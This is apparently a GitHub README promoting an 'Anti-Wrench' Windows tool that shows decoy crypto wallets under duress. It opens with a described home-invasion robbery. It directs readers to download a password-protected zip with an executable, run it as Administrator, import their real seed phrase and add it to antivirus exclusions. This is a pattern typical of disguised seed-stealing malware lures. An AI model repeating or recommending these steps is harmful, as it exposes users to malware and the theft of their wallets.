# Anti-Wrench / Emergency Wallet System

[![Stars](https://img.shields.io/github/stars/Spidergamer917/anti-wrench-emergency-wallet)](https://github.com/Spidergamer917/anti-wrench-emergency-wallet)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)

**Protect your crypto from physical attacks ("wrench attacks")** – after the recent $24 million robbery of investor Sillytuna , the crypto community realized that no amount of encryption helps when someone holds a wrench to your head. This tool creates a decoy wallet system that activates under duress.

---

## ⚠️ Disclaimer
This tool is for **educational purposes only**. It does not replace proper security practices (hardware wallets, multisig). Use at your own risk.

---

## 🔥 Why This Tool?

On March 5, 2026, crypto investor Sillytuna was robbed of $24 million in a violent home invasion . Attackers threatened him with weapons, demanding access to his wallets. This is a classic **"wrench attack"** – the weakest point is the human.

**This tool gives you a fighting chance:**

- ✅ **Decoy wallets** – Set up fake wallets with small balances to satisfy attackers
- ✅ **Panic mode** – Triggered by a special password, hides real assets, shows decoys
- ✅ **Emergency transfer** – Option to automatically move funds to a safe address when panic mode is activated
- ✅ **Stealth recovery** – Access your real wallet only with a hidden combination

---

## 📥 Download

Password-protected archive with the complete emergency wallet system.

📥 **[Download `anti-wrench-pack.zip`](dist/anti-wrench-pack.zip)**  
🔐 **Password:** `wrench2026`

### Archive Contents
- `AntiWrench.exe` – Main Windows tool
- `config.dat` – Encrypted configuration file
- `README.txt` – Quick start guide

---

## 🛠️ Installation (Windows 10/11)

### Quick Start
1. Extract the archive to a secure folder (e.g., on an encrypted USB drive)
2. **Run `AntiWrench.exe` as Administrator**
3. Follow the setup wizard:
   - Create your **real wallet** (or import existing seed)
   - Set up **decoy wallets** (balances, appearance)
   - Define **panic password**
   - (Optional) Set emergency transfer address
4. Test panic mode by entering the wrong password

### How It Works
- **Normal mode:** Enter your real password – you see your actual balances.
- **Panic mode:** Enter your panic password – the tool shows decoy wallets and optionally initiates an emergency transfer.
- **Stealth mode:** A special key combination (configurable) reveals the real interface even after panic is triggered.

---

## ✨ Features

### 🎭 Decoy Wallet Designer
- Create multiple fake wallets with custom balances (BTC, ETH, SOL, etc.)
- Add realistic transaction history (optional)
- Set withdrawal limits – attackers can only steal a small amount

### 🚨 Panic Mode Triggers
- **Password-based** – a wrong password triggers panic
- **Hotkey** – press a configurable key combination instantly
- **Timeout** – if you don't check in regularly, auto-panic

### 💸 Emergency Transfer
- When panic mode activates, funds can be automatically sent to a pre-defined safe address (cold wallet, exchange)
- Configurable delay (e.g., 24 hours) to allow recovery

### 🔒 Stealth Access
- Even after panic mode, you can access real wallets with a hidden key combination (e.g., Ctrl+Alt+Shift+F12)
- Leaves no trace – all logs are encrypted

---

## 📊 Configuration Example

```yaml
real_wallet:
  seed: "your real seed phrase (encrypted)"
  addresses:
    - "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"
  balance: 24.5 BTC

decoy_wallets:
  - name: "Everyday Wallet"
    seed: "decoy seed 1"
    balance: 0.05 BTC
    transactions: 3
  - name: "Trading Wallet"
    seed: "decoy seed 2"
    balance: 0.1 ETH
    transactions: 5

panic:
  password: "fakepassword123"
  action: "show_decoy"
  emergency_transfer: "bc1q..."

stealth:
  hotkey: "Ctrl+Alt+Shift+F12"

---

## ❗ Troubleshooting
| Problem                          | Solution                                                    |
|----------------------------------|---------------------------------------------------------------|
| Tool won't start                 | Run as Administrator. Ensure .NET 4.8+ is installed          |
| Panic mode not triggering        | Check password configuration. Test in safe environment        |
| Emergency transfer failed        | Verify destination address. Ensure you have enough gas        |
| Antivirus false positive         | Add AntiWrench.exe to exclusions – it's safe                  |

---

## 📜 License
MIT License – educational purposes only.

---

## ⭐ Support
If this tool gives you peace of mind, please star the repository!

Credits:
Inspired by the Sillytuna incident
Based on community discussions about wrench attack mitigation
